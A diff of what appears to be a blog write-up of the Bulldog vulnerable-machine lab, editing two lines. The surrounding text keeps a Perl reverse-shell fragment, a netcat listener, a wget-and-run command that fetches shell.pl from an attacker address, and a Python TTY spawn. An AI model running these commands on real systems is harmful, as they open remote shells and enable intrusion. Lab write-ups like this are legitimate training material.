@@ -244,7 +244,7 @@ use Socket;$i="192.168.0.213";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobynam
 
 `1234 - port to connect back to` 
 
-After we launch netcat listener - `nc -lvp 1234`, download and run the perl file on victim machine using: `pwd && wget 192.168.0.213/shell.pl && perl shell.pl`. *wget* downloads the file and *perl* compiles + runs it. 
+After we launch netcat listener - `nc -lvp 1234`, download and run the perl file on victim machine using: `pwd && wget 192.168.0.213/shell.pl && perl shell.pl`. *wget* retrieves the file from our webserver and *perl* compiles + runs it. 
 
 <img src="/img/blog/bulldog/Bulldog11.png">
 
@@ -290,8 +290,8 @@ crtstuff.c
 * youCANTgetultimatePASSWORD
 
 > Note: before doing this you might have to spawn a TTY shell 
-TTY shell command: `python -c 'import pty; pty.spawn("/bin/sh")'`
 
+*TTY shell command:* `python -c 'import pty; pty.spawn("/bin/sh")'`
 
 After what it seemes ages, I manage to get the correct password! `SUPERultimatePASSWORDyouCANTget`. 
 
